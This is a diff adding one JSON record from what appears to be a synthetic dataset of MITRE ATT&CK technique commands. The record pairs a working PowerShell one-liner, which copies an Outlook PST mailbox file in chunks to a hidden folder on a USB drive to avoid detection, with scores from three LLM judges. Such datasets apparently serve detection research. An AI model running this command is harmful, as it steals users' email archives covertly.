@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1052",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$dl=(Get-Volume -DriveType Removable | Select -First 1 -Expand DriveLetter); $dest=\"$dl`:\\.sys\"; New-Item -ItemType Directory -Force -Path $dest | Out-Null; attrib +h $dest; $src=(Get-ChildItem \"$env:USERPROFILE\\Documents\\Outlook Files\\*.pst\" -ErrorAction SilentlyContinue | Select -First 1); if($src){ $bytes=[IO.File]::ReadAllBytes($src.FullName); for($i=0;$i -lt $bytes.Length;$i+=1048576){ $e=[Math]::Min($i+1048575,$bytes.Length-1); $chunk=$bytes[$i..$e]; [IO.File]::WriteAllBytes((Join-Path $dest (\"chunk_{0:D8}.bin\" -f $i)),$chunk) } ; Write-Output (\"Chunked {0} into {1}\" -f $src.FullName,$dest) | Out-File \"$dest\\op.log\" -Append }",
+  "explanation": "Splits a PST file into 1 MB chunks and writes them to a hidden folder on a removable drive to reduce detection risk and throttle I/O.",
+  "rationale_steps": [
+    "Select removable drive and hide a staging directory",
+    "Locate a PST file for extraction",
+    "Write file data in small chunks directly to USB",
+    "Record a local log message using Write-Output"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1052-a3760856-3ebce6ce",
+  "source_prompt_hash": "a3760856",
+  "timestamp_utc": "2025-09-30T05:14:51.683873Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed PowerShell with balanced delimiters, valid cmdlets/parameters (including acceptable abbreviated -Expand), correct escaping for $dl`:\\, and appropriate command separators.",
+        "semantic_score": 4,
+        "semantic_justification": "Creates a hidden directory on a removable drive and writes a PST file in 1 MB chunks there (consistent with T1052), though it reads the entire file into memory so it doesn't truly throttle I/O and may fail on very large files.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T10:11:07.073875Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed with balanced quotes, parentheses, and braces, proper variable assignments, error handling, and correct use of cmdlets and methods.",
+        "semantic_score": 5,
+        "semantic_justification": "The command fully implements the T1052 technique by identifying a removable drive, creating a hidden directory, locating Outlook PST files, splitting them into chunks, and writing them to the removable medium for physical exfiltration.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T10:11:09.984559Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, using correct PowerShell syntax for variable assignment, cmdlets, pipes, loops, and .NET method calls, including the problematic string literal which is still parseable.",
+        "semantic_score": 2,
+        "semantic_justification": "The command fails to achieve its claimed intent of writing files to a hidden folder on a removable drive because the `$dest` path is malformed with a literal backtick, preventing directory creation and subsequent file writes.",
+        "combined_score": 3.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T10:11:39.500865Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.667,
+    "llm_average_score": 4.333,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
